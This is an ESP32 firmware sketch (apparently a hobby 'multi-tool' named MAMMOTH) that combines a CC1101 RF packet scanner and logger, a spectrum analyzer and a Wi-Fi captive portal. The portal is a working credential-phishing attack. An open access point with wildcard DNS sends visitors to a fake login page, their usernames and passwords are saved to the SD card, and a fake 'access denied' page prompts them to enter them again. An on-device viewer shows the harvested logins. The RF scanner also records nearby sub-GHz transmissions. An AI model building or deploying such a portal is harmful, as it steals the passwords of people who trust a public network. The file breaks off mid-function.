#include <TFT_eSPI.h>
#include <SPI.h>
#include <FS.h>
#include <SD.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <OneButton.h>
#include <SmartRC_CC1101.h>
#include <math.h>

// === Пины ===
#define BUTTON_PIN  15
#define POT_PIN     34
#define SD_CS_PIN   14
#define TFT_CS_PIN  5
#define CC1101_SCK  18
#define CC1101_MISO 19
#define CC1101_MOSI 23
#define CC1101_CSN  27
#define CC1101_GDO0 26

// === Объекты ===
TFT_eSPI tft = TFT_eSPI();
OneButton menuButton(BUTTON_PIN, true);
DNSServer dnsServer;
WebServer webServer(80);
SmartRC_CC1101 radio;

// === Состояния ===
int currentMode = 0;     // 0=меню, 1=WiFi AP, 2=Логи, 3=RF Scanner, 4=Spectrum Analyzer
int selectedMenu = 0;
int lastSelectedMenu = -1;
bool dataCaptured = false;
String capturedUser = "";
String capturedPass = "";

const char* AP_SSID = "ESP32-Portal";

const char* menuItems[] = {
  "WiFi AP + Portal",
  "RF Scanner (CC1101)",
  "Spectrum Analyzer",
  "View SD Logs",
  "About System"
};
const int MENU_COUNT = 5;

// ============================================================
// === RF SCANNER: Диапазоны по 5 МГц ===
// ============================================================
const float RF_RANGES[][2] = {
  {315.00, 320.00}, {320.00, 325.00}, {325.00, 330.00}, {330.00, 335.00},
  {335.00, 340.00}, {340.00, 345.00}, {345.00, 350.00}, {350.00, 355.00},
  {355.00, 360.00}, {360.00, 365.00}, {365.00, 370.00}, {370.00, 375.00},
  {375.00, 380.00}, {380.00, 385.00}, {385.00, 390.00}, {390.00, 395.00},
  {395.00, 400.00}, {400.00, 405.00}, {405.00, 410.00}, {410.00, 415.00},
  {415.00, 420.00}, {420.00, 425.00}, {425.00, 430.00}, {430.00, 435.00},
  {435.00, 440.00}, {440.00, 445.00}, {445.00, 450.00}, {450.00, 455.00},
  {455.00, 460.00}, {460.00, 465.00}, {465.00, 470.00}, {470.00, 475.00},
  {475.00, 480.00}, {480.00, 485.00}, {485.00, 490.00}, {490.00, 495.00},
  {495.00, 500.00},
  {860.00, 865.00}, {865.00, 870.00}, {870.00, 875.00}, {875.00, 880.00},
  {880.00, 885.00}, {885.00, 890.00}, {890.00, 895.00}, {895.00, 900.00}
};
const int RF_RANGE_COUNT = sizeof(RF_RANGES) / sizeof(RF_RANGES[0]);

int rfRangeIndex = 23;  // 430-435 МГц
float rfCurrentFreq = 433.92;
bool rfInitialized = false;
unsigned long lastRfScan = 0;
String lastRfCode = "Waiting...";
int lastRssi = -138;
int rfPacketCount = 0;

// ============================================================
// === SPECTRUM ANALYZER ===
// ============================================================
#define SA_NUM_BARS 20
#define SA_BAR_WIDTH_DEG 18
#define SA_OUTER_RADIUS 112
#define SA_INNER_RADIUS 50
#define SA_MAX_BAR_HEIGHT 60

#define SA_MODE_NORMAL    0
#define SA_MODE_PEAK_HOLD 1
#define SA_MODE_WATERFALL 2
int saMode = SA_MODE_NORMAL;

float saCenterFreq = 433.92;
float saFreqValues[SA_NUM_BARS];
int saRssiValues[SA_NUM_BARS];
int saPeakValues[SA_NUM_BARS];
unsigned long saLastScanTime = 0;
int saScanInterval = 150;

// === Логи ===
int logStartLine = 0;

// === Фильтр потенциометра ===
#define FILTER_SIZE 8
int potFilter[FILTER_SIZE];
int potIndex = 0;

int readPotFiltered() {
  potFilter[potIndex] = analogRead(POT_PIN);
  potIndex = (potIndex + 1) % FILTER_SIZE;
  long sum = 0;
  for (int i = 0; i < FILTER_SIZE; i++) sum += potFilter[i];
  return sum / FILTER_SIZE;
}

// === Изоляция SPI ===
void isolateSPI() {
  pinMode(TFT_CS_PIN, OUTPUT);
  digitalWrite(TFT_CS_PIN, HIGH);
  pinMode(SD_CS_PIN, OUTPUT);
  digitalWrite(SD_CS_PIN, HIGH);
  delay(2);
}

// ============================================================
// === 🦣 ЗАСТАВКА MAMMOTH ===
// ============================================================
void drawBootScreen() {
  // ASCII-арт в Serial Monitor
  Serial.println();
  Serial.println("================================================");
  Serial.println("  __  __                     _   _   _       _ ");
  Serial.println(" |  \\/  | __ _ _ __ ___  ___| |_| | | | __ _| |");
  Serial.println(" | |\\/| |/ _` | '_ ` _ \\/ __| __| |_| |/ _` | |");
  Serial.println(" | |  | | (_| | | | | | \\__ \\ |_|  _  | (_| | |");
  Serial.println(" |_|  |_|\\__,_|_| |_| |_|___/\\__|_| |_|\\__,_|_|");
  Serial.println("================================================");
  Serial.println("          M A M M O T H   v 1 . 0              ");
  Serial.println("         ESP32 Multi-Tool Platform             ");
  Serial.println("      RF Scanner | Spectrum Analyzer           ");
  Serial.println("          WiFi Portal | SD Logger              ");
  Serial.println("================================================");
  Serial.println();

  // Графическое изображение на TFT
  tft.fillScreen(TFT_BLACK);

  // Рисуем стилизованного мамонта
  int cx = 120;  // центр X
  int cy = 100;  // центр Y

  // Тело мамонта (большой овал)
  tft.fillEllipse(cx, cy, 55, 35, TFT_BROWN);
  tft.drawEllipse(cx, cy, 55, 35, TFT_DARKGREY);

  // Голова
  tft.fillCircle(cx - 45, cy - 10, 25, TFT_BROWN);
  tft.drawCircle(cx - 45, cy - 10, 25, TFT_DARKGREY);

  // Хобот (изогнутая линия)
  for (int i = 0; i < 20; i++) {
    int x = cx - 65 - i;
    int y = cy - 5 + (int)(sin(i * 0.3) * 8) + i/2;
    tft.fillCircle(x, y, 4 - i/6, TFT_BROWN);
  }

  // Бивни (два белых изогнутых клыка)
  tft.drawLine(cx - 55, cy, cx - 75, cy + 20, TFT_WHITE);
  tft.drawLine(cx - 53, cy, cx - 73, cy + 20, TFT_WHITE);
  tft.drawLine(cx - 50, cy + 5, cx - 70, cy + 25, TFT_WHITE);
  tft.drawLine(cx - 48, cy + 5, cx - 68, cy + 25, TFT_WHITE);

  // Ноги (4 столбика)
  tft.fillRect(cx - 30, cy + 25, 10, 25, TFT_BROWN);
  tft.fillRect(cx - 10, cy + 25, 10, 25, TFT_BROWN);
  tft.fillRect(cx + 10, cy + 25, 10, 25, TFT_BROWN);
  tft.fillRect(cx + 30, cy + 25, 10, 25, TFT_BROWN);

  // Хвост
  tft.drawLine(cx + 50, cy - 10, cx + 65, cy - 20, TFT_BROWN);
  tft.drawLine(cx + 50, cy - 8, cx + 65, cy - 18, TFT_BROWN);

  // Шерсть (маленькие штрихи)
  for (int i = 0; i < 15; i++) {
    int x = cx - 40 + i * 6;
    int y = cy - 25 + (i % 3) * 3;
    tft.drawLine(x, y, x + 2, y - 4, TFT_DARKGREY);
  }

  // Глаз
  tft.fillCircle(cx - 50, cy - 15, 3, TFT_BLACK);
  tft.fillCircle(cx - 51, cy - 16, 1, TFT_WHITE);

  // Текст "MAMMOTH"
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(3);
  tft.setCursor(50, 160);
  tft.println("MAMMOTH");

  // Версия
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(95, 185);
  tft.println("v1.0");

  // Подпись
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(55, 205);
  tft.println("ESP32 Multi-Tool");

  // Рамка
  tft.drawRoundRect(5, 5, 230, 230, 10, TFT_GREEN);
  tft.drawRoundRect(8, 8, 224, 224, 8, TFT_DARKGREEN);

  delay(2500);
}

// ============================================================
// === БЕЗОПАСНОЕ чтение пакета (защита от Stack Smashing) ===
// ============================================================
bool readSafePacket(byte* buffer, byte& len) {
  if (!radio.CheckReceiveFlag()) return false;

  radio.SpiStrobe(0x3A); // SFRX: очистка RX FIFO
  delayMicroseconds(100);

  byte rxBytes = radio.SpiReadReg(0x3B);
  len = rxBytes & 0x7F;

  if (len == 0 || len > 32) {
    radio.SpiStrobe(0x3A);
    return false;
  }

  isolateSPI();
  pinMode(CC1101_CSN, OUTPUT);
  digitalWrite(CC1101_CSN, LOW);
  SPI.transfer(0x3F | 0x80);
  for (int i = 0; i < len; i++) {
    buffer[i] = SPI.transfer(0x00);
  }
  digitalWrite(CC1101_CSN, HIGH);
  return true;
}

// === HTML страницы ===
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:monospace;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#001a00;padding:30px;border:2px solid #0f0;border-radius:8px;width:300px;}
h2{color:#0f0;text-align:center;}
input{width:90%;padding:10px;margin:8px 0;border:1px solid #0f0;background:#000;color:#0f0;}
button{width:100%;padding:12px;background:#000;color:#0f0;border:2px solid #0f0;cursor:pointer;}
</style></head><body>
<div class="card"><h2>> ACCESS TERMINAL _</h2>
<form action="/submit" method="POST">
<input type="text" name="user" placeholder="> login_" required>
<input type="password" name="pass" placeholder="> password_" required>
<button type="submit">[ EXECUTE ]</button>
</form></div></body></html>
)rawliteral";

const char errorPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>body{font-family:monospace;background:#000;color:#f00;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{background:#1a0000;padding:30px;border:2px solid #f00;border-radius:8px;width:300px;text-align:center;}
a{color:#0f0;}</style></head><body>
<div class="card"><h2>> ACCESS DENIED</h2><p>> invalid_credentials</p>
<a href="/login">> retry_</a></div></body></html>
)rawliteral";

void handleRoot() { webServer.sendHeader("Location", "/login"); webServer.send(302, "text/plain", ""); }
void handleLogin() { webServer.send(200, "text/html", loginPage); }
void handleSubmit() {
  if (webServer.method() == HTTP_POST) {
    capturedUser = webServer.arg("user");
    capturedPass = webServer.arg("pass");
    dataCaptured = true;
    saveUserDataToSD(capturedUser, capturedPass);
    Serial.println("=== [EDU] Captured ===");
    webServer.send(200, "text/html", errorPage);
  }
}
void handleNotFound() { webServer.sendHeader("Location", "/login"); webServer.send(302, "text/plain", ""); }

void saveUserDataToSD(String user, String pass) {
  isolateSPI();
  tft.endWrite();
  SD.begin(SD_CS_PIN);
  delay(100);
  int recordNumber = 1;
  File countFile = SD.open("/logs.csv", FILE_READ);
  if (countFile) {
    while (countFile.available()) {
      String line = countFile.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) recordNumber++;
    }
    countFile.close();
  }
  File file = SD.open("/logs.csv", FILE_APPEND);
  if (!file) {
    file = SD.open("/logs.csv", FILE_WRITE);
    if (file) file.close();
    file = SD.open("/logs.csv", FILE_APPEND);
  }
  if (file) {
    file.print("#"); file.print(recordNumber);
    file.print(" Login:"); file.print(user);
    file.print(" Pass:"); file.println(pass);
    file.close();
    Serial.println("[SD] SUCCESS");
  }
  tft.init(); tft.setRotation(0); delay(50);
}

// === Логирование RF пакетов на SD ===
void logRfPacket(float freq, byte len, int rssi, String hexData) {
  isolateSPI();
  SD.begin(SD_CS_PIN);
  delay(50);
  File file = SD.open("/rf_logs.csv", FILE_APPEND);
  if (!file) {
    file = SD.open("/rf_logs.csv", FILE_WRITE);
    if (file) {
      file.println("Time_sec,Freq_MHz,Len,RSSI_dBm,Hex_Data");
      file.close();
    }
    file = SD.open("/rf_logs.csv", FILE_APPEND);
  }
  if (file) {
    file.print(millis() / 1000); file.print(",");
    file.print(freq, 2); file.print(",");
    file.print(len); file.print(",");
    file.print(rssi); file.print(",\"");
    file.print(hexData); file.println("\"");
    file.close();
  }
}

void viewLogs() {
  isolateSPI();
  tft.endWrite();
  SD.begin(SD_CS_PIN);
  delay(100);
  File file = SD.open("/logs.csv", FILE_READ);
  if (!file || file.size() == 0) {
    if (file) file.close();
    tft.init(); tft.setRotation(0); delay(50);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setTextSize(2);
    tft.setCursor(40, 100);
    tft.println("NO LOGS YET");
    delay(2000);
    currentMode = 0; lastSelectedMenu = -1; drawMenu();
    return;
  }
  int totalRecords = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) totalRecords++;
  }
  file.seek(0);
  tft.init(); tft.setRotation(0); delay(50);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(10, 10);
  tft.println("> VIEWING LOGS");
  tft.drawLine(10, 25, 230, 25, TFT_DARKGREEN);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(10, 28);
  tft.print("Records: "); tft.print(totalRecords);
  int currentRecord = 0, displayRecord = 0, yPosition = 48;
  while (file.available() && displayRecord < 2) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      if (currentRecord >= logStartLine) {
        int loginStart = line.indexOf("Login:") + 6;
        int passStart = line.indexOf(" Pass:") + 6;
        String loginStr = (loginStart > 5 && passStart > 5) ? line.substring(loginStart, passStart - 6) : line;
        String passStr = (passStart > 5) ? line.substring(passStart) : "";
        if (loginStr.length() > 20) loginStr = loginStr.substring(0, 20) + "..";
        if (passStr.length() > 20) passStr = passStr.substring(0, 20) + "..";
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.setCursor(40, yPosition);
        tft.print("Login: "); tft.print(loginStr); yPosition += 18;
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setCursor(40, yPosition);
        tft.print("Pass: "); tft.print(passStr); yPosition += 30;
        displayRecord++;
      }
      currentRecord++;
    }
  }
  file.close();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(20, 200);
  tft.println("Pot: Scroll | Dbl: Back");
  tft.drawCircle(120, 120, 118, TFT_GREEN);
}

// === Меню ===
void drawMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.drawCircle(120, 120, 118, TFT_GREEN);
  tft.drawCircle(120, 120, 116, TFT_DARKGREEN);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(70, 25);
  tft.println("> MAMMOTH v1.0");
  tft.drawLine(40, 38, 200, 38, TFT_DARKGREEN);
  int visibleCount = 3, startY = 50, itemHeight = 48;
  for (int i = 0; i < visibleCount; i++) {
    int idx = (selectedMenu - 1 + i + MENU_COUNT) % MENU_COUNT;
    int y = startY + i * itemHeight;
    if (i == 1) {
      tft.drawRoundRect(30, y, 180, 40, 8, TFT_GREEN);
      tft.fillRect(34, y+4, 172, 32, TFT_BLACK);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(2);
      tft.setCursor(40, y+10);
      tft.print(">");
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setTextSize(1);
      tft.setCursor(60, y+14);
      tft.print(menuItems[idx]);
    } else {
      tft.drawRoundRect(40, y+5, 160, 32, 6, TFT_DARKGREEN);
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setTextSize(1);
      tft.setCursor(70, y+15);
      tft.print(menuItems[idx]);
    }
  }
  int dotY = 205, dotStartX = 120 - (MENU_COUNT * 10) / 2;
  for (int i = 0; i < MENU_COUNT; i++) {
    if (i == selectedMenu) tft.fillCircle(dotStartX + i * 10, dotY, 3, TFT_GREEN);
    else tft.drawCircle(dotStartX + i * 10, dotY, 3, TFT_DARKGREEN);
  }
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(65, 222);
  tft.println("[BUTTON]=EXECUTE");
}

void updateMenuSelection() {
  int potValue = readPotFiltered();
  int zone = potValue / (4096 / MENU_COUNT);
  if (zone >= MENU_COUNT) zone = MENU_COUNT - 1;
  if (abs(zone - selectedMenu) > 0) { selectedMenu = zone; drawMenu(); lastSelectedMenu = selectedMenu; }
}

// ============================================================
// === ОБРАБОТЧИКИ КНОПОК ===
// ============================================================
void handleClick() {
  if (currentMode == 0) {
    if (selectedMenu == 0) startWiFiAP();
    else if (selectedMenu == 1) startRfScanner();
    else if (selectedMenu == 2) startSpectrumAnalyzer();
    else if (selectedMenu == 3) { currentMode = 2; logStartLine = 0; viewLogs(); }
    else {
      tft.fillScreen(TFT_BLACK);
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.setTextSize(2);
      tft.setCursor(40, 110);
      tft.print("MAMMOTH v1.0");
      delay(1500);
      currentMode = 0; lastSelectedMenu = -1; drawMenu();
    }
  }
  else if (currentMode == 3) {
    // RF Scanner: 1 клик = следующий диапазон (+5 МГц)
    rfRangeIndex++;
    if (rfRangeIndex >= RF_RANGE_COUNT) rfRangeIndex = 0;
    rfCurrentFreq = (RF_RANGES[rfRangeIndex][0] + RF_RANGES[rfRangeIndex][1]) / 2.0;
    isolateSPI();
    radio.setMHZ(rfCurrentFreq);
    radio.SetRx();
    Serial.print("[BTN] Range: ");
    Serial.print(RF_RANGES[rfRangeIndex][0]);
    Serial.print(" - ");
    Serial.println(RF_RANGES[rfRangeIndex][1]);
    drawRfScreen();
  }
  else if (currentMode == 4) {
    // Spectrum Analyzer: 1 клик = смена режима
    saMode = (saMode + 1) % 3;
    for (int i = 0; i < SA_NUM_BARS; i++) saPeakValues[i] = -138;
    const char* modeNames[] = {"Normal", "Peak Hold", "Waterfall"};
    Serial.print("[SA] Mode: ");
    Serial.println(modeNames[saMode]);
    drawSpectrum();
    drawCenterInfo();
  }
}

void handleDoubleClick() {
  if (currentMode == 1) {
    webServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true);
  }
  // Двойной клик ВСЕГДА возвращает в меню
  currentMode = 0;
  lastSelectedMenu = -1;
  drawMenu();
}

void startWiFiAP() {
  currentMode = 1; dataCaptured = false;
  WiFi.softAP(AP_SSID);
  IPAddress IP = WiFi.softAPIP();
  dnsServer.start(53, "*", IP);
  webServer.on("/", handleRoot);
  webServer.on("/login", handleLogin);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  tft.fillScreen(TFT_BLACK);
  tft.drawCircle(120, 120, 118, TFT_GREEN);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(30, 40);
  tft.println("> AP_ACTIVE");
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(25, 80);
  tft.print("SSID: "); tft.println(AP_SSID);
  tft.setCursor(25, 120);
  tft.print("IP:   "); tft.println(IP.toString());
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(30, 180);
  tft.println("[DBL-CLK]=EXIT");
}

// ============================================================
// === CC1101 ИНИЦИАЛИЗАЦИЯ ===
// ============================================================
void initCC1101() {
  Serial.println("[RF] Initializing CC1101 V3...");
  isolateSPI();
  delay(100);
  radio.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CSN);
  radio.Init();
  if (radio.getCC1101()) {
    radio.setRxBW(812.50);
    radio.setMHZ(rfCurrentFreq);
    radio.SetRx();
    rfInitialized = true;
    Serial.print("[RF] CC1101 OK on ");
    Serial.print(radio.getMHZ());
    Serial.println(" MHz");
  } else {
    rfInitialized = false;
    Serial.println("[RF] ERROR!");
  }
}

// ============================================================
// === RF SCANNER ===
// ============================================================
void startRfScanner() {
  currentMode = 3;
  if (!rfInitialized) initCC1101();
  rfPacketCount = 0;
  lastRfCode = "Waiting...";
  drawRfScreen();
}

void drawRfScreen() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(45, 20);
  tft.println("RF SCANNER");
  tft.drawLine(30, 43, 210, 43, TFT_DARKGREEN);

  if (!rfInitialized) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(35, 100);
    tft.println("CC1101 ERROR!");
    return;
  }

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(35, 50);
  tft.print("Range: ");
  tft.print(RF_RANGES[rfRangeIndex][0], 2);
  tft.print(" - ");
  tft.print(RF_RANGES[rfRangeIndex][1], 2);
  tft.println(" MHz");

  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(35, 68);
  tft.print(rfCurrentFreq, 2);
  tft.println(" MHz");

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(35, 92);
  tft.print("RSSI: ");
  tft.print(lastRssi);
  tft.println(" dBm   ");

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(35, 115);
  tft.print("Packets: ");
  tft.print(rfPacketCount);
  tft.println("   ");

  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(35, 132);
  tft.println("LAST CAPTURED:");
  tft.setTextSize(2);
  tft.setCursor(35, 147);
  String displayCode = lastRfCode;
  if (displayCode.length() > 18) displayCode = displayCode.substring(0, 18) + "..";
  tft.println(displayCode);

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(35, 180);
  tft.println("POT: Fine Tune");
  tft.setCursor(35, 193);
  tft.println("BTN: +5MHz | DBL: Exit");
}

void handleRfScanner() {
  if (!rfInitialized) return;

  // 1. Управление частотой потенциометром (ваша логика диапазонов 315-500, 860-900)
  int potVal = readPotFiltered();
  int step = map(potVal, 0, 4095, 0, 99);
  float newFreq = RF_RANGES[rfRangeIndex][0] + step * 0.05;

  if (abs(newFreq - rfCurrentFreq) > 0.01) {
    rfCurrentFreq = newFreq;
    isolateSPI();
    radio.setMHZ(rfCurrentFreq);
    radio.SetRx();
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setTextSize(2);
    tft.setCursor(35, 68);
    tft.print(rfCurrentFreq, 2);
    tft.println(" MHz  ");
  }

  // 2. Обновление RSSI
  if (millis() - lastRfScan > 150) {
    lastRfScan = millis();
    isolateSPI();
    int rssi = radio.getRssi();
    if (abs(rssi - lastRssi) > 3) {
      lastRssi = rssi;
      tft.setTextColor(lastRssi > -70 ? TFT_GREEN : TFT_WHITE, TFT_BLACK);
      tft.setTextSize(2);
      tft.setCursor(35, 92);
      tft.print("RSSI: ");
      tft.print(lastRssi);
      tft.println(" dBm   ");
    }
  }

  // 3. Захват пакета
  if (radio.CheckReceiveFlag()) {
    byte buffer[64];
    byte len = radio.ReceiveData(buffer);

    if (len > 0 && len <= 64) {
      String hexData = "";
      for (int i = 0; i < len; i++) {
        if (buffer[i] < 0x10) hexData += "0";
        hexData += String(buffer[i], HEX);
        if (i < len - 1) hexData += " ";
      }
      hexData.toUpperCase();

      // 🛡️ УМНЫЙ ФИЛЬТР: определяем тип "мусора"
      bool isNoise = false;
      String noiseType = "";

      // Проверка 1: Пустые пакеты (00, FF, 0F, F0)
      int emptyCount = 0;
      for (int i = 0; i < len; i++) {
        if (buffer[i] == 0x00 || buffer[i] == 0xFF ||
            buffer[i] == 0x0F || buffer[i] == 0xF0) {
          emptyCount++;
        }
      }
      if (emptyCount > len * 0.8) {
        isNoise = true;
        noiseType = "EMPTY";
      }

      // Проверка 2: Повторяющиеся байты (как ваш случай 1F 1F 1F...)
      if (!isNoise && len >= 8) {
        int repeatCount = 0;
        byte mostCommonByte = buffer[1]; // Берём второй байт (первый может быть заголовком)
        for (int i = 1; i < len; i++) {
          if (buffer[i] == mostCommonByte) repeatCount++;
        }
        if (repeatCount > len * 0.7) { // Более 70% байт одинаковые
          isNoise = true;
          noiseType = "REPEAT";
        }
      }

      // Проверка 3: Известные фоновые паттерны (M-Bus счётчики)
      if (!isNoise && len >= 4) {
        // Паттерн: первый байт + много 1F
        int count1F = 0;
        for (int i = 1; i < len; i++) {
          if (buffer[i] == 0x1F) count1F++;
        }
        if (count1F > len * 0.6) {
          isNoise = true;
          noiseType = "M-BUS";
        }
      }

      // Обрабатываем только реальные пакеты
      if (!isNoise && len >= 4) {
        rfPacketCount++;
        lastRfCode = hexData;

        Serial.print("[RF] #"); Serial.print(rfPacketCount);
        Serial.print(" | "); Serial.print(rfCurrentFreq, 2);
        Serial.print(" MHz | "); Serial.print(len);
        Serial.print("b | RSSI: "); Serial.print(lastRssi);
        Serial.print(" dBm | "); Serial.println(hexData);

        // Логирование на SD
        logRfPacket(rfCurrentFreq, len, lastRssi, hexData);

        // Обновление экрана
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(35, 115);
        tft.print("Packets: ");
        tft.print(rfPacketCount);
        tft.println("   ");

        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setTextSize(2);
        tft.setCursor(35, 147);
        String displayCode = hexData;
        if (displayCode.length() > 18) displayCode = displayCode.substring(0, 18) + "..";
        tft.print(displayCode);
        tft.println("    ");
      }
      else if (isNoise) {
        // Для отладки: показываем, что мы отфильтровали
        Serial.print("[FILTER] "); Serial.print(noiseType);
        Serial.print(" | "); Serial.println(hexData);
      }
    }
  }
}

// ============================================================
// === SPECTRUM ANALYZER ===
// ============================================================
void saUpdateFreqArray() {
  float startFreq = saCenterFreq - (SA_NUM_BARS / 2) * 0.1;
  for (int i = 0; i < SA_NUM_BARS; i++) {
    saFreqValues[i] = startFreq + i * 0.1;
  }
}

void saScanSpectrum() {
  for (int i = 0; i < SA_NUM_BARS; i++) {
    isolateSPI();
    radio.setMHZ(saFreqValues[i]);
    radio.SetRx();
    delay(5);
    int rssi = radio.getRssi();
    saRssiValues[i] = rssi;
    if (saMode != SA_MODE_NORMAL && rssi > saPeakValues[i]) {
      saPeakValues[i] = rssi;
    }
  }
}

uint16_t saRssiToColor(int rssi) {
  if (rssi <= -90) return TFT_DARKGREEN;
  if (rssi <= -80) return TFT_GREEN;
  if (rssi <= -70) return TFT_YELLOW;
  if (rssi <= -60) return TFT_ORANGE;
  return TFT_RED;
}

int saRssiToHeight(int rssi) {
  if (rssi <= -100) return 0;
  if (rssi >= -40) return SA_MAX_BAR_HEIGHT;
  return map(rssi, -100, -40, 0, SA_MAX_BAR_HEIGHT);
}

void saDrawBar(int index, int height, uint16_t color) {
  if (height <= 0) return;
  int startAngle = index * SA_BAR_WIDTH_DEG - 90;
  int endAngle = startAngle + SA_BAR_WIDTH_DEG - 2;
  int outerR = SA_OUTER_RADIUS;
  int innerR = SA_OUTER_RADIUS - height;
  if (innerR < SA_INNER_RADIUS) innerR = SA_INNER_RADIUS;
  tft.drawArc(120, 120, outerR, innerR, startAngle, endAngle, color, TFT_BLACK);
}

void drawSpectrum() {
  tft.fillCircle(120, 120, SA_OUTER_RADIUS, TFT_BLACK);
  tft.fillCircle(120, 120, SA_INNER_RADIUS - 2, TFT_BLACK);
  tft.drawCircle(120, 120, SA_OUTER_RADIUS + 2, TFT_DARKGREEN);
  tft.drawCircle(120, 120, SA_INNER_RADIUS - 2, TFT_DARKGREEN);

  for (int i = 0; i < SA_NUM_BARS; i++) {
    int height = saRssiToHeight(saRssiValues[i]);
    uint16_t color = saRssiToColor(saRssiValues[i]);

    if (saMode != SA_MODE_NORMAL && saPeakValues[i] > saRssiValues[i] + 3) {
      int peakHeight = saRssiToHeight(saPeakValues[i]);
      saDrawBar(i, peakHeight, TFT_DARKGREY);
    }
    saDrawBar(i, height, color);
  }

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextSize(1);
  for (int i = 0; i < SA_NUM_BARS; i += 4) {
    float angle = (i * SA_BAR_WIDTH_DEG - 90) * PI / 180;
    int x = 120 + cos(angle) * (SA_OUTER_RADIUS + 8);
    int y = 120 + sin(angle) * (SA_OUTER_RADIUS + 8);
    if (i == 0 || i == SA_NUM_BARS/2) tft.setCursor(x - 15, y - 4);
    else if (i < SA_NUM_BARS/2) tft.setCursor(x - 5, y - 4);
    else tft.setCursor(x - 20, y - 4);
    char freqStr[10];
    sprintf(freqStr, "%.1f", saFreqValues[i]);
    tft.print(freqStr);
  }
}

void drawCenterInfo() {
  tft.fillCircle(120, 120, SA_INNER_RADIUS - 3, TFT_BLACK);
  int peakIdx = 0;
  for (int i = 1; i < SA_NUM_BARS; i++) {
    if (saRssiValues[i] > saRssiValues[peakIdx]) peakIdx = i;
  }

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(75, 72);
  tft.println("> SPECTRUM");

  const char* modeNames[] = {"Normal", "PeakHold", "Waterfall"};
  tft.setTextColor(TFT_ORANGE, TFT_BLACK);
  tft.setCursor(75, 85);
  tft.print("[");
  tft.print(modeNames[saMode]);
  tft.println("]");

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(65, 100);
  tft.print("Center:");
  tft.print(saCenterFreq, 1);
  tft.println("MHz");

  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(65, 115);
  tft.print("Peak:");
  tft.print(saFreqValues[peakIdx], 1);
  tft.println("MHz");

  int peakRssi = saRssiValues[peakIdx];
  tft.setTextColor(saRssiToColor(peakRssi), TFT_BLACK);
  tft.setCursor(65, 130);
  tft.print("RSSI:");
  tft.print(peakRssi);
  tft.println("dBm");

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(65, 150);
  tft.println("POT:Tune");
  tft.setCursor(65, 162);
  tft.println("BTN:Mode");
}

void startSpectrumAnalyzer() {
  currentMode = 4;
  if (!rfInitialized) initCC1101();
  saCenterFreq = 433.92;
  saUpdateFreqArray();
  for (int i = 0; i < SA_NUM_BARS; i++) {
    saRssiValues[i] = -138;
    saPeakValues[i] = -138;
  }
  saMode = SA_MODE_NORMAL;
  drawSpectrum();
  drawCenterInfo();
}

void handleSpectrumAnalyzer() {
  // Плавное изменение частоты потенциометром (315-868 МГц)
  int potVal = readPotFiltered();
  float newCenter = 315.0 + (potVal / 4095.0) * (868.0 - 315.0);
